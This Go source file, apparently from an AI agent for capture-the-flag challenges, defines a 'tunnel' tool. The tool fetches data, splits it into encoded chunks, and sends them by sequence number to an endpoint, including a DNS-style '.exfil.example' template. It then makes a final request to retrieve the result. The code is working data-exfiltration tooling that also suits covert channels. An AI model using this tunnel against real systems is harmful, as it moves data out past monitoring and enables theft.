package kernel

import (
	"bytes"
	"context"
	"encoding/base32"
	"encoding/base64"
	"encoding/json"
	"fmt"
	"io"
	"net/http"
	"net/url"
	"strings"
	"time"

	"ctfagent/internal/llm"
)

// ---------------------------------------------------------------------------
// tunnel：把一段数据切成块、按指定编码塞进协议通道发出去，再回头取结果
//
// 适用面比「DNS 外带」宽得多：凡是「一次只能带一点点数据、但可以发很多次」的通道
// （DNS label、ICMP、请求头、URL 路径、分片表单）都是同一个形状：
//
//	分块 → 编码 → 带上序号和总数 → 复用会话 → 最后一跳取回
//
// 手工做很容易漏掉「序号从 0 开始」「总数要一致」「后续块要复用 session」这些细节，
// 而错一个就会得到「数据不完整」。固化成一个工具，模型只描述通道形状。
// ---------------------------------------------------------------------------

// tunnelOpts 是隧道参数。抽成命名类型，方便 sendChunk 复用。
type tunnelOpts struct {
	Source       string            `json:"source"`        // 数据源 URL（与 data 二选一）
	Data         string            `json:"data"`          // 直接给数据
	Endpoint     string            `json:"endpoint"`      // 发送目标
	Template     string            `json:"template"`      // 形如 {seq}-{total}-{chunk}.exfil.example
	Encoding     string            `json:"encoding"`      // base32（默认）/ base64 / hex / raw
	ChunkSize    int               `json:"chunk_size"`    // 每块原始字节数，默认 32
	JSONField    string            `json:"json_field"`    // 默认 query
	SessionField string            `json:"session_field"` // 默认 session
	Method       string            `json:"method"`        // 默认 POST（JSON）；GET 则拼 query
	QueryParam   string            `json:"query_param"`   // GET 时的参数名，默认 query
	Finish       string            `json:"finish"`        // 例如 GET http://h/retrieve?session={session}
	Headers      map[string]string `json:"headers"`
	Pad          bool              `json:"pad"` // base32 保留 = 填充（默认去掉，DNS label 更短）
}

func (t *ToolSet) doTunnel(ctx context.Context, tc llm.ToolCall) string {
	var a tunnelOpts
	if err := llm.Args(tc, &a); err != nil {
		return err.Error()
	}

	// 1) 取数据
	var data []byte
	switch {
	case a.Data != "":
		data = []byte(a.Data)
	case a.Source != "":
		body, err := t.fetchOnce(ctx, a.Source, a.Headers)
		if err != nil {
			return "取数据失败: " + err.Error()
		}
		// 题面数据常在 JSON 的某个字段里，顺手解一层
		var obj map[string]any
		if json.Unmarshal(body, &obj) == nil {
			for _, k := range []string{"content", "data", "text", "body", "document"} {
				if v, ok := obj[k].(string); ok {
					data = []byte(v)
					break
				}
			}
		}
		if data == nil {
			data = body
		}
	default:
		return "需要 source（数据源 URL）或 data（直接给数据）"
	}
	if len(data) == 0 {
		return "数据为空"
	}

	enc := strings.ToLower(strings.TrimSpace(a.Encoding))
	if enc == "" {
		enc = "base32"
	}
	chunkSize := a.ChunkSize
	if chunkSize <= 0 {
		chunkSize = 32
	}
	if a.JSONField == "" {
		a.JSONField = "query"
	}
	if a.SessionField == "" {
		a.SessionField = "session"
	}
	if a.QueryParam == "" {
		a.QueryParam = "query"
	}
	if a.Endpoint == "" {
		return "需要 endpoint（发送目标）"
	}
	if a.Template == "" {
		a.Template = "{seq}-{total}-{chunk}"
	}

	var chunks [][]byte
	for i := 0; i < len(data); i += chunkSize {
		end := i + chunkSize
		if end > len(data) {
			end = len(data)
		}
		chunks = append(chunks, data[i:end])
	}
	total := len(chunks)

	session := ""
	var lastResp string
	for i, c := range chunks {
		token := encodeChunk(c, enc, a.Pad)
		q := strings.NewReplacer(
			"{seq}", fmt.Sprint(i),
			"{total}", fmt.Sprint(total),
			"{chunk}", token,
			"{session}", session,
		).Replace(a.Template)
		body, err := t.sendChunk(ctx, a, q, session)
		if err != nil {
			return fmt.Sprintf("第 %d/%d 块发送失败: %v\n已成功 %d 块，session=%s", i+1, total, err, i, session)
		}
		lastResp = body
		if session == "" {
			session = sniffSession(body, a.SessionField)
		}
	}

	var sb strings.Builder
	fmt.Fprintf(&sb, "已传输 %d 块 / %d 字节（编码 %s，块大小 %d）\n", total, len(data), enc, chunkSize)
	if session != "" {
		fmt.Fprintf(&sb, "session=%s\n", session)
	} else {
		sb.WriteString("（响应里没有 session 字段 —— 若后续块需要会话，检查 session_field 名字）\n")
	}
	if a.Finish != "" && session != "" {
		target := strings.ReplaceAll(a.Finish, "{session}", session)
		final, err := t.finishTunnel(ctx, target)
		if err != nil {
			fmt.Fprintf(&sb, "收尾请求失败: %v\n", err)
		} else {
			fmt.Fprintf(&sb, "收尾请求: %s\n%s\n", target, final)
		}
	}
	if a.Finish != "" && session == "" {
		final, err := t.finishTunnel(ctx, strings.ReplaceAll(a.Finish, "{session}", ""))
		if err == nil {
			fmt.Fprintf(&sb, "收尾请求（无 session）:\n%s\n", final)
		}
	}
	fmt.Fprintf(&sb, "最后一块的响应（截断）:\n%s", trimSnippet(lastResp, 400))
	return sb.String()
}

// encodeChunk 按指定编码把一块数据变成可放进 URL/JSON 的文本。
func encodeChunk(b []byte, enc string, pad bool) string {
	switch enc {
	case "base64":
		s := base64.StdEncoding.EncodeToString(b)
		if !pad {
			s = strings.TrimRight(s, "=")
		}
		return strings.NewReplacer("+", "-", "/", "_").Replace(s) // URL 安全
	case "hex":
		return hexEncode(b)
	case "raw":
		return string(b)
	default: // base32
		s := base32.StdEncoding.EncodeToString(b)
		if !pad {
			s = strings.TrimRight(s, "=")
		}
		return s
	}
}

// sendChunk 发一块。POST 走 JSON，GET 走 query。
func (t *ToolSet) sendChunk(ctx context.Context, a tunnelOpts, q, session string) (string, error) {
	client := t.web
	if client == nil {
		client = http.DefaultClient
	}
	if strings.EqualFold(a.Method, "GET") {
		u := a.Endpoint + "?" + url.Values{a.QueryParam: {q}}.Encode()
		if session != "" {
			u += "&" + url.Values{a.SessionField: {session}}.Encode()
		}
		req, err := http.NewRequestWithContext(ctx, http.MethodGet, u, nil)
		if err != nil {
			return "", err
		}
		for k, v := range a.Headers {
			req.Header.Set(k, v)
		}
		return readLimited(client, req)
	}
	payload := map[string]string{a.JSONField: q}
	if session != "" {
		payload[a.SessionField] = session
	}
	buf, _ := json.Marshal(payload)
	req, err := http.NewRequestWithContext(ctx, http.MethodPost, a.Endpoint, bytes.NewReader(buf))
	if err != nil {
		return "", err
	}
	req.Header.Set("Content-Type", "application/json")
	for k, v := range a.Headers {
		req.Header.Set(k, v)
	}
	return readLimited(client, req)
}

func readLimited(client *http.Client, req *http.Request) (string, error) {
	resp, err := client.Do(req)
	if err != nil {
		return "", err
	}
	defer resp.Body.Close()
	body, _ := io.ReadAll(io.LimitReader(resp.Body, 256<<10))
	if resp.StatusCode >= 400 {
		return string(body), fmt.Errorf("HTTP %d: %s", resp.StatusCode, trimSnippet(string(body), 200))
	}
	return string(body), nil
}

// sniffSession 从响应里找会话 id（不同实现字段名不一样，多试几个）。
func sniffSession(body, preferred string) string {
	var obj map[string]any
	if json.Unmarshal([]byte(body), &obj) != nil {
		return ""
	}
	keys := []string{preferred, "session", "session_id", "sessionId", "sid", "id"}
	for _, k := range keys {
		if k == "" {
			continue
		}
		if v, ok := obj[k].(string); ok && v != "" {
			return v
		}
	}
	return ""
}

// finishTunnel 发收尾请求，支持 "GET url" / "POST url body" 两种写法。
func (t *ToolSet) finishTunnel(ctx context.Context, spec string) (string, error) {
	method, rest := "GET", spec
	if i := strings.IndexByte(spec, ' '); i > 0 {
		method = strings.ToUpper(spec[:i])
		rest = strings.TrimSpace(spec[i+1:])
	}
	body := ""
	if j := strings.Index(rest, " "); j > 0 && method != "GET" {
		body = rest[j+1:]
		rest = rest[:j]
	}
	client := t.web
	if client == nil {
		client = http.DefaultClient
	}
	req, err := http.NewRequestWithContext(ctx, method, rest, strings.NewReader(body))
	if err != nil {
		return "", err
	}
	if body != "" {
		req.Header.Set("Content-Type", "application/json")
	}
	return readLimited(client, req)
}

// fetchOnce 取一次 URL。
func (t *ToolSet) fetchOnce(ctx context.Context, u string, headers map[string]string) ([]byte, error) {
	cctx, cancel := context.WithTimeout(ctx, 30*time.Second)
	defer cancel()
	req, err := http.NewRequestWithContext(cctx, http.MethodGet, u, nil)
	if err != nil {
		return nil, err
	}
	for k, v := range headers {
		req.Header.Set(k, v)
	}
	client := t.web
	if client == nil {
		client = http.DefaultClient
	}
	resp, err := client.Do(req)
	if err != nil {
		return nil, err
	}
	defer resp.Body.Close()
	return io.ReadAll(io.LimitReader(resp.Body, 8<<20))
}
